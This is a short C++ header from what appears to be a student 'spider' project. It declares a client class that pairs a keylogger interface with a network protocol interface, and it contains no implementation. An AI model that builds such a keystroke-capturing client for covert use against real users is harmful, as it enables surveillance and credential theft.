/*
** ClientCore.hpp for cpp_spider in /home/god/TEK3/C++/cpp_spider/includes/ClientCore.hpp
**
** Made by Maxime PILLON
** Login   <maxime.pillon@epitech.eu>
**
** Started on  Thu Oct 05 10:58:55 2017 Maxime PILLON
** Last update Thu Oct 05 10:58:55 2017 Maxime PILLON
*/

#pragma once

#include "KeyLogger/IKeyLogger.hpp"
#include "Protocol/IProtocol.hpp"

namespace spider
{
  class ClientCore
  {
  protected:
    IKeyLogger	_keylogger;
    IProtocol	_proto;

  public:
    ClientCore();
    ~ClientCore();

    void run();
  };
}